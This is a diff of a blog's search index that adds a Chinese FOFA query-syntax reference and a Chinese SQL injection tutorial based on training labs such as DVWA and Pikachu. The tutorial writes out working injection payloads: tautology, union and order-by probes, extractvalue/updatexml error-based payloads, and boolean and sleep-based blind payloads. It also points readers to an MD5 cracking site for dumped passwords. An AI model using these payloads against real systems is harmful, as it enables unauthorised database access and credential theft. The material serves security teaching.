@@ -1,6 +1,78 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>fofa常用语法</title>
+    <url>/2024/07/17/fofa%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112339739.png" alt="image-20240717112339739"></p>
+<h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><p><em>Posted by hackeyes on April 17, 2021</em></p>
+<p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；如果查询表达式有多个与或关系，尽量在外面用（）包含起来；</p>
+<p>&#x3D;&#x3D;完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain&#x3D;&#x3D;”qq.com”</p>
+<h1 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h1><table>
+<thead>
+<tr>
+<th>可以使用括号 和 &amp;&amp;</th>
+<th></th>
+<th>!&#x3D;等符号，如</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=&quot;discuz&quot; </span><br><span class="line"></span><br><span class="line">body=&quot;content=WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>title&#x3D;”beijing” 从标题中搜索“北京”</p>
+<p>header&#x3D;”elastic” 从http头中搜索“elastic”</p>
+<p>body&#x3D;”网络空间测绘” 从html正文中搜索“网络空间测绘”</p>
+<p>domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。</p>
+<p>icon_hash&#x3D;”-247388890” 搜索使用此icon的资产。 仅限FOFA高级会员使用</p>
+<p>host&#x3D;”.gov.cn” 从url中搜索”.gov.cn” 搜索要用host作为名称</p>
+<p>port&#x3D;”6379” 查找对应“6379”端口的资产</p>
+<p>icp&#x3D;”京ICP证030173号” 查找备案号为“京ICP证030173号”的网站 搜索网站类型资产</p>
+<p>ip&#x3D;”1.1.1.1” 从ip中搜索包含“1.1.1.1”的网站 搜索要用ip作为名称</p>
+<p>ip&#x3D;”220.181.111.1&#x2F;24” 查询IP为“220.181.111.1”的C网段资产</p>
+<p>status_code&#x3D;”402” 查询服务器状态为“402”的资产</p>
+<p>protocol&#x3D;”quic” 查询quic协议资产 搜索指定协议类型(在开启端口扫描的情况下有效)</p>
+<p>country&#x3D;”CN” 搜索指定国家(编码)的资产。</p>
+<p>region&#x3D;”HeNan” 搜索指定行政区的资产。</p>
+<p>city&#x3D;”HanDan” 搜索指定城市的资产。</p>
+<p>cert&#x3D;”baidu” 搜索证书(https或者imaps等)中带有baidu的资产。</p>
+<p>cert.subject&#x3D;”Oracle Corporation” 搜索证书持有者是Oracle Corporation的资产</p>
+<p>cert.issuer&#x3D;”DigiCert” 搜索证书颁发者为DigiCert Inc的资产</p>
+<p>cert.is_valid&#x3D;true 验证证书是否有效，true有效，false无效，仅限FOFA高级会员使用</p>
+<p>banner&#x3D;users &amp;&amp; protocol&#x3D;ftp 搜索FTP协议中带有users文本的资产。</p>
+<p>type&#x3D;service 搜索所有协议资产，支持subdomain和service两种。</p>
+<p>os&#x3D;”centos” 搜索操作系统为CentOS资产。</p>
+<p>server&#x3D;&#x3D;”Microsoft-IIS&#x2F;10” 搜索IIS 10服务器。</p>
+<p>app&#x3D;”Microsoft-Exchange” 搜索Microsoft-Exchange设备</p>
+<p>after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01” 时间范围段搜索</p>
+<p>asn&#x3D;”19551” 搜索指定asn的资产。</p>
+<p>org&#x3D;”Amazon.com, Inc.” 搜索指定org(组织)的资产。</p>
+<p>base_protocol&#x3D;”udp” 搜索指定udp协议的资产。</p>
+<p>is_fraud&#x3D;false 排除仿冒&#x2F;欺诈数据</p>
+<p>is_honeypot&#x3D;false 排除蜜罐数据，仅限FOFA高级会员使用</p>
+<p>is_ipv6&#x3D;true 搜索ipv6的资产,只接受true和false。</p>
+<p>is_domain&#x3D;true 搜索域名的资产,只接受true和false。</p>
+<p>port_size&#x3D;”6” 查询开放端口数量等于”6”的资产，仅限FOFA会员使用</p>
+<p>port_size_gt&#x3D;”6” 查询开放端口数量大于”6”的资产，仅限FOFA会员使用</p>
+<p>port_size_lt&#x3D;”12” 查询开放端口数量小于”12”的资产，仅限FOFA会员使用</p>
+<p>ip_ports&#x3D;”80,161” 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)</p>
+<p>ip_country&#x3D;”CN” 搜索中国的ip资产(以ip为单位的资产数据)。</p>
+<p>ip_region&#x3D;”Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。</p>
+<p>ip_city&#x3D;”Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。</p>
+<p>ip_after&#x3D;”2021-03-18” 搜索2021-03-18以后的ip资产(以ip为单位的资产数据)。</p>
+<p>ip_before&#x3D;”2019-09-09” 搜索2019-09-09以前的ip资产(以ip为单位的资产数据)。</p>
+]]></content>
+      <categories>
+        <category>Penetration Testing Basic</category>
+      </categories>
+      <tags>
+        <tag>info</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Burpsuite 从入门到精通desu</title>
     <url>/2024/07/08/Burpsuite%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/</url>
     <content><![CDATA[<h1 id="Burpsuite从入门到入土"><a href="#Burpsuite从入门到入土" class="headerlink" title="Burpsuite从入门到入土"></a>Burpsuite从入门到入土</h1><p>在Burp suite的使用中，会出现如下的选项</p>
@@ -230,75 +302,672 @@
       </tags>
   </entry>
   <entry>
-    <title>fofa常用语法</title>
-    <url>/2024/07/17/fofa%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112339739.png" alt="image-20240717112339739"></p>
-<h2 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h2><p><em>Posted by hackeyes on April 17, 2021</em></p>
-<p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；如果查询表达式有多个与或关系，尽量在外面用（）包含起来；</p>
-<p>&#x3D;&#x3D;完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain&#x3D;&#x3D;”qq.com”</p>
-<h1 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h1><table>
+    <title>SQL注入 二开desu</title>
+    <url>/2024/07/08/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="SQL注入二开"><a href="#SQL注入二开" class="headerlink" title="SQL注入二开"></a>SQL注入二开</h1><p>本教程基于SQL i-Labs,pikachu,dvwa等靶场做拓展</p>
+<h1 id="基本原理和概念简介"><a href="#基本原理和概念简介" class="headerlink" title="基本原理和概念简介"></a>基本原理和概念简介</h1><p>SQL注入是黑客攻击最常见的方法，SQL注入作为OWASP中四大Web应用程序十大安全漏洞之一，也可以被一些没有太多网络安全技术“脚本小子”利用，因此掌握SQL注入原理和预防机制非常重要</p>
+<h1 id="HOW-to-build-SQLI-Lab"><a href="#HOW-to-build-SQLI-Lab" class="headerlink" title="HOW to build SQLI-Lab"></a>HOW to build SQLI-Lab</h1><h3 id="简单的部署"><a href="#简单的部署" class="headerlink" title="简单的部署"></a>简单的部署</h3><p>图方便的话 直接通过Docker部署就可以了</p>
+<p>也可以部署在Web应用系统平台，</p>
+<h3 id="从０开始部署"><a href="#从０开始部署" class="headerlink" title="从０开始部署"></a>从０开始部署</h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708172147084.png" alt="image-20240708172147084"></p>
+<h3 id="Web应用程序系统"><a href="#Web应用程序系统" class="headerlink" title="Web应用程序系统"></a>Web应用程序系统</h3><p>Web应用程序系统的总体体系结构如图一所示</p>
+<p>客户端是浏览器，服务端通常包括了Web服务器，数据库服务器和高级语言解释器，典型的Web服务器架构包括</p>
+<p>Apache+PHP+MySQL</p>
+<p>IIS＋ASP+MYSQL等</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708171810391.png" alt="image-20240708171810391"></p>
+<h1 id="HOW-does-it-form-–SQL-INJECTION"><a href="#HOW-does-it-form-–SQL-INJECTION" class="headerlink" title="HOW does it form –SQL INJECTION"></a>HOW does it form –SQL INJECTION</h1><p>SQL注入本质是攻击者在Web表单或者URL中插入SQL命令或者片段到查询字符串中,当Web服务器没有严格验证输入和传递字符串的有效性时,攻击者就可以达到<strong>欺骗数据库服务器</strong>,执行恶意SQL命令的效果</p>
+<p>在此之前还要了解一个概念**’隐式转换’**</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708173609585.png" alt="image-20240708173609585"></p>
+<h1 id="SQL-INJECTION-LIST"><a href="#SQL-INJECTION-LIST" class="headerlink" title="SQL INJECTION LIST"></a>SQL INJECTION LIST</h1><p>包括了</p>
+<p>同义SQL注入,联合注入,基于报错的注入,盲注.</p>
+<h4 id="Tautologic-SQL注入-真理SQL"><a href="#Tautologic-SQL注入-真理SQL" class="headerlink" title="Tautologic SQL注入(真理SQL)"></a>Tautologic SQL注入(真理SQL)</h4><p>这是一种简单的攻击方法,在系统原SQL命令中插入了一个tautologic(常为正确的)条件子句,使原SQL语句的条件限定不起作用.</p>
+<h4 id="联合SQL注入"><a href="#联合SQL注入" class="headerlink" title="联合SQL注入"></a>联合SQL注入</h4><p>本质上利用了SQL命令中的联合查询,从而可以执行插入的查询,从特定的数据表中窃取信息</p>
+<p>建议在此之前 先学会基本的SQL注入的增删改查,并清除SQL库表的结构如何</p>
+<h4 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h4><p>攻击者将格式错误的SQL命令作为攻击负载使系统返回一些报错,从而使系统返回一些过度暗示的信息</p>
+<p>比如说Order by 1—–n(列溢出报错)</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>对于盲注攻击,攻击者会构造一些SQL查询条件,系统对这些查询条件的不同状态会有不同响应,进而获得系统的内部信息</p>
+<h1 id="SQL-injection-Begin"><a href="#SQL-injection-Begin" class="headerlink" title="SQL injection Begin"></a>SQL injection Begin</h1><h2 id="数字型—最基本的检验"><a href="#数字型—最基本的检验" class="headerlink" title="数字型—最基本的检验"></a>数字型—最基本的检验</h2><p>数字型可以检验程序本身是否有对用户的输入做任何的额外处理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------------测试步骤-----------------------</span><br><span class="line">1.加单引号</span><br><span class="line">URL:www.text.com/text.php?id=1&#x27;]</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1&#x27;</span><br><span class="line">这时SQL语句出错，程序无法从数据库中查询出数据，此时可以判断出大概率存在注入，因为只有服务器将对应的单引号一起当作SQL语句执行了才会出现报错，但这也并不绝对，也有可能是程序本身的问题</span><br><span class="line">2.加 and 1=1</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=1</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1 and 1=1</span><br><span class="line">这时语句执行一定是正常的，因为加入了tautologic式的条件子句</span><br><span class="line">3.加 and 1=2</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=2</span><br><span class="line">对应数据服务器响应的SQL命令</span><br><span class="line">select * from table where id =1 and 1=2</span><br><span class="line">这时语句可以正常执行但无法查询出任何结构，返回数据与原始网页会存在一定的差异</span><br></pre></td></tr></table></figure>
+
+<p>如果这三个payload传入过后同上述代码块中提出的响应是一致的，那么程序本身就是并没有对用户的输入做任何额外处理的，则可以判断该URL存在数字型注入</p>
+<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>当传入的参数类型为字符串时，若存在漏洞则称为字符型漏洞，字符型和数字型最大的一个区别在于数字型不需要单引号来闭合而字符串一般需要单引号来闭合对应传入的参数</p>
+<p>字符型语句如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where id = ‘admin’</span><br></pre></td></tr></table></figure>
+
+<p>因此在构造payload时通过闭合单引号可以成功执行语句</p>
+<p>比方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708200640557.png" alt="image-20240708200640557"></p>
+<p>–为什么要这么做</p>
+<p>首先服务端要求我们传入的参数是字符型 在传入的过程中需要将我们自己的恶意指令注入就需要首先满足隐式转换的条件–即先让它接收到需要的字符型变量，然后再通过一些条件子句代入我们自己的语句</p>
+<p>也就是说 我们可以这么做</p>
+<p>原本的查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27;（用户输入点）&#x27;+后续语句</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们在输入点输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<p>那么可以如此合成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27; 1&#x27; or 1=1 #&#x27;+后续语句</span><br></pre></td></tr></table></figure>
+
+<p>可以发现不但闭合了前面的语句，同时通过条件语句插入了攻击者的语句，并注释（使无效化）后面可能会出现的另外一些条件语句。</p>
+<p>可以用一句话很优雅的总结数字型和字符型</p>
+<p>​                              <strong>—猎人往往以猎物的方式出现—</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708201225404.png" alt="image-20240708201225404"></p>
+<h2 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h2><p>联合查询可以一句SQL语句中执行多个查询任务，把查询任务从一个表追加到另外一个表，使用UNION或者UNION　ALL来实现</p>
+<p>UNION ALL和UNION的区别是UNION ALL操作符可以查询重复的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708202413083.png" alt="image-20240708202413083"></p>
+<p>使用UNION注入也是有前提条件的,Union all左右两边查询的列数必须一致</p>
+<p>以上图为例</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> user_id,first_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> user_id,first_name,last_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候你可以发现,union all操作符前的sql语句查询了users表中user_id&#x3D;1所对应的user_id列和first_name.而在union操作符后的sql语句则不同,其对应多查询了一个last_name参数，这个时候查询语句不成立。</p>
+<h3 id="怎么确定字段数"><a href="#怎么确定字段数" class="headerlink" title="怎么确定字段数"></a>怎么确定字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># by2时回显正常</span><br><span class="line">order by 2#</span><br><span class="line"># by3时回显异常</span><br><span class="line">order by 3#</span><br></pre></td></tr></table></figure>
+
+<p>思考：<br>1.为什么用order by 可以证明前面语句查询了三列数据呢？<br>2.我们为什么要知道前面查询了多少语句呢？<br>解：<br>第一题：<br>首先我们要知道order by的作用：order by 简单的来说 就是对前面查询的数据进行分组，分组依据是前面查询的内容的属性。比如说前面查询的数据是甲、乙、丙，我们可以根据这三种属性的一到三种进行分类，但是不能超过三种。所以上面order by 4 会报错误信息。因此可以依据此来判断前面查询了几列数据。<br>第二题：<br>因为使用union函数进行查询时，union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样，所以我们必需要知道前面语句查询了多少个元素。比如，此语句：select 甲,乙,丙 union select 1,2,3 因为前面查询的语句有三个元素（甲，乙，丙），所以后面查询的语句必须是三个元素（1，2，3）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709100240768.png" alt="image-20240709100240768"></p>
+<p>类似上图所说的 我们就可以通过联合查询得到一些关键性的信息</p>
+<p>这里我们也可以介绍一个比较重要的知识点，在MYSQL５.０以上版本，存在一个自带的数据库:information_schema(重点)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709101446333.png" alt="image-20240709101446333"></p>
+<p>information_schema数据库中还要三个表非常重要：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMATA:　表里包含所有数据库的名字</span><br><span class="line">TABLES：　　表里包含所有数据库的所有表</span><br><span class="line">COLUMNS：　　表里包含所有数据库的所有表的所有字段</span><br></pre></td></tr></table></figure>
+
+<p>联合注入的过程:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">１.判断是否存在注入，注入是字符型还是整数型</span><br><span class="line">２.猜解SQL查询语句中的字段数（ｏｒｄｅｒ　ｂｙ）</span><br><span class="line">３.确定显示位</span><br><span class="line">４.获取当前数据库（爆库</span><br><span class="line">５.获取数据库中的表（爆表</span><br><span class="line">６.获取表中的字段名（爆字段</span><br><span class="line">７.下载数据（爆数据</span><br><span class="line">这里以Pikachu联系平台为例</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110242890.png" alt="image-20240709110242890"></p>
+<p>这里截取一个基本的流程 以DVWA靶场为例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110813626.png" alt="image-20240709110813626"></p>
+<p>一般爆出的密码是经过一层加密的,这个时候可以利用在线工具对应解码爆出真实的密码</p>
+<p>这里附上在线工具</p>
+<p><a href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点，如果不符合数据库语法规则就会 报错并返回错误信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的特殊字符：&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>
+
+<p>在MySQL高版本中添加了对XML文档进行查询和修改的函数,这两个函数常用于报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br></pre></td></tr></table></figure>
+
+<p>原因:当这两个函数在执行时,如果出现XML文档路径错误就会产生报错.</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><ul>
+<li>此函数从目标XML中返回包含所查询值的字符串,语法:extractvalue(XML_document,xpath_string)</li>
+</ul>
+<p>第一个参数:</p>
+<p>string格式,即XNL文档对象名称</p>
+<p>第二个参数:Xpath_string(Xpath形式的字符串,为XML文档的路径)</p>
+<p>extractvalue使用时若Xpath_string格式出错,mysql数据库服务器是会爆出错误的,<strong>对应的报错也会很明显的给我们指出错误类型为xpath语法错误</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709151441863.png" alt="image-20240709151441863"></p>
+<p>extractvalue原本是用于从documentr返回包含string的字符串,那么string参数不符合xpath的语法就会爆出错误,将查询结果同步放在信息里.<strong>这本质上也是利用了该函数报错的危险特性,将我们想要查询的结果以非xpath语法格式强行放入该函数,”勒令”它帮我们查询需要的信息</strong></p>
+<h4 id="这里突然插入-SQL注入的基本思路"><a href="#这里突然插入-SQL注入的基本思路" class="headerlink" title="-这里突然插入  SQL注入的基本思路-"></a>-这里突然插入  SQL注入的基本思路-</h4><p>SQL注入本质上其实也都明白了,就是利用现成的服务端给我们预留的查询语句进而实现从无关紧要的信息越位到更为重要更为核心的信息</p>
+<p><strong>那么首先我们要搞懂的就是该如何利用这条服务端留给我们的现成的语句了</strong></p>
+<p>其实道理很简单:</p>
+<p>一,先搞清楚服务端目前供给我们来查询的是什么</p>
+<p>那么这个时候就是可以通过思考SQL典型的树状结构,一步一步爆出我们想要的东西</p>
+<p>SQL经典结构:   库(schema)–&gt;表(tables)—&gt;字段(column)</p>
+<p>从这些最基本的出发,我们可以逐步摸清并加以利用,实现从边缘信息到重要信息的爬取</p>
+<h4 id="注入思路实践简述"><a href="#注入思路实践简述" class="headerlink" title="注入思路实践简述"></a>注入思路实践简述</h4><p><strong>爆库名</strong>–&gt;<strong>爆表数</strong>–&gt;<strong>爆表名</strong>–&gt;<strong>爆列名</strong>–&gt;<strong>获得用户名和密码</strong></p>
+<p>那么这里开始利用extractvalue()做一些经典的操作(doge)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192227234.png" alt="image-20240709192227234"></p>
+<h3 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h3><p>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</p>
+<p>作用:该百年文档中符合条件的节点的值</p>
+<p>语法:</p>
+<p>update(XML_document, xpath_string, new_value)</p>
+<p>第一个参数;string格式,为XML文档对象的名称</p>
+<p>第二个参数:代表路径,xpath形式的字符串例如&#x2F;title</p>
+<p>第三个参数:string格式,替换查找到的符合条件的数据</p>
+<p>updatexml使用同extractvalue()函数,都是当出现错误时爆出错误信息,并弹出对应的暗示信息,这个就没什么好说的了,直接截图套路即可,自行copy即可(doge)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192932960.png" alt="image-20240709192932960"></p>
+<p>其实本质很简单,只是单纯的用两个0x7e占位罢了</p>
+<h2 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注顾名思义,就是一抹黑,无回显无报错的查询.</p>
+<h4 id="1-只能判断是否存在注入和注入的类型"><a href="#1-只能判断是否存在注入和注入的类型" class="headerlink" title="1.只能判断是否存在注入和注入的类型"></a>1.只能判断是否存在注入和注入的类型</h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193722352.png" alt="image-20240709193722352"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193749808.png" alt="image-20240709193749808"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193815739.png" alt="image-20240709193815739"></p>
+<p>由图可知,对应的盲注就是像上面这样只有两种反馈信息,要么就是查询到了,要么就是查询不到,那么我们该怎么判断是否成功注入了呢?那么就要推翻我们只能从查询信息和报错信息中汲取攻击面的固有思维,从别的方面深入,一击毙命.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709194633365.png" alt="image-20240709194633365"></p>
+<p>这里以pikachu靶场中的盲注题型为例,假设一开始我们已知用户vince,想爆出他们的密码</p>
+<table>
 <thead>
 <tr>
-<th>可以使用括号 和 &amp;&amp;</th>
-<th></th>
-<th>!&#x3D;等符号，如</th>
+<th align="center">序号</th>
+<th align="center">构造ID取值</th>
+<th align="center">反馈</th>
 </tr>
 </thead>
 <tbody><tr>
-<td></td>
-<td></td>
-<td></td>
+<td align="center">1</td>
+<td align="center">vince</td>
+<td align="center">存在信息回显</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">‘</td>
+<td align="center">不存在信息回显</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">vince’ and 1&#x3D;1#</td>
+<td align="center">存在信息回显</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">vince’ and 1&#x3D;2#</td>
+<td align="center">不存在信息回显</td>
 </tr>
 </tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=&quot;discuz&quot; </span><br><span class="line"></span><br><span class="line">body=&quot;content=WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure>
+<p>由条件3和4的构造真假返回对应不同的结果,可知存在SQL注入漏洞</p>
+<p>不过只能知道存在是不够的,要加以利用才是硬道理</p>
+<h4 id="2-猜解当前数据库名称"><a href="#2-猜解当前数据库名称" class="headerlink" title="2.猜解当前数据库名称"></a>2.猜解当前数据库名称</h4><h5 id="1-猜解数据库名称长度-二分法"><a href="#1-猜解数据库名称长度-二分法" class="headerlink" title="1)猜解数据库名称长度(二分法)"></a>1)猜解数据库名称长度(二分法)</h5><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709195523654.png" alt="image-20240709195523654"></p>
+<h5 id="2）判断数据库名称的字符组成元素"><a href="#2）判断数据库名称的字符组成元素" class="headerlink" title="2）判断数据库名称的字符组成元素"></a>2）判断数据库名称的字符组成元素</h5><p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个 位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后 逐个击破。</p>
+<p><a href="https://www.sojson.com/asciitable.html">ASCII码对照表|ASCII编码 (sojson.com)</a></p>
+<h5 id="substr的用法"><a href="#substr的用法" class="headerlink" title="substr的用法"></a>substr的用法</h5><p>substr在这里主要用作将字符串中单单一个字符截取出来,后续我们使用ascil函数与二分法逐步迭代出我们需要的数字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200603601.png" alt="image-20240709200603601"></p>
+<h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><p><strong>猜解表的个数</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200545105.png" alt="image-20240709200545105"></p>
+<p><strong>猜解表名–从长度到具体的字符组成</strong></p>
+<p>这里是猜解长度</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200844644.png" alt="image-20240709200844644"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201142364.png" alt="image-20240709201142364"></p>
+<p>剩下的字段名字段值不过多赘述,流程是一致的</p>
+<p>最后如果密码有经过某些解密方法那么为只需要重新带回就好了.最后验证一下字段的有效性就可以了</p>
+<p>最后在这里想说的是 手工爆破的工作量是很大的,可以尝试学习python自动化脚本精简掉大部分的内容</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>倘若界面返回值只有一种True,无论输入任何值,返回情况都会按正常来处理,加入特定的时间函数,通过查看WEB页面返回的时间差来判断注入的语句是否正确.</p>
+<h4 id="猜解数据库的名称"><a href="#猜解数据库的名称" class="headerlink" title="猜解数据库的名称"></a>猜解数据库的名称</h4><p>其实本质上和布尔盲注的区别就在于, 它将返回信息转化成了响应时间上的区别,若判断条件为真,则执行sleep(n)函数,达到正常响应时间短基础上再延迟相应时间n瞄的效果;若判断条件为假则返回设置的1,此时不执行sleep(n)函数</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(length(database())=4,sleep(5),1);#</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(5),1);#</span><br></pre></td></tr></table></figure>
 
-<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>title&#x3D;”beijing” 从标题中搜索“北京”</p>
-<p>header&#x3D;”elastic” 从http头中搜索“elastic”</p>
-<p>body&#x3D;”网络空间测绘” 从html正文中搜索“网络空间测绘”</p>
-<p>domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。</p>
-<p>icon_hash&#x3D;”-247388890” 搜索使用此icon的资产。 仅限FOFA高级会员使用</p>
-<p>host&#x3D;”.gov.cn” 从url中搜索”.gov.cn” 搜索要用host作为名称</p>
-<p>port&#x3D;”6379” 查找对应“6379”端口的资产</p>
-<p>icp&#x3D;”京ICP证030173号” 查找备案号为“京ICP证030173号”的网站 搜索网站类型资产</p>
-<p>ip&#x3D;”1.1.1.1” 从ip中搜索包含“1.1.1.1”的网站 搜索要用ip作为名称</p>
-<p>ip&#x3D;”220.181.111.1&#x2F;24” 查询IP为“220.181.111.1”的C网段资产</p>
-<p>status_code&#x3D;”402” 查询服务器状态为“402”的资产</p>
-<p>protocol&#x3D;”quic” 查询quic协议资产 搜索指定协议类型(在开启端口扫描的情况下有效)</p>
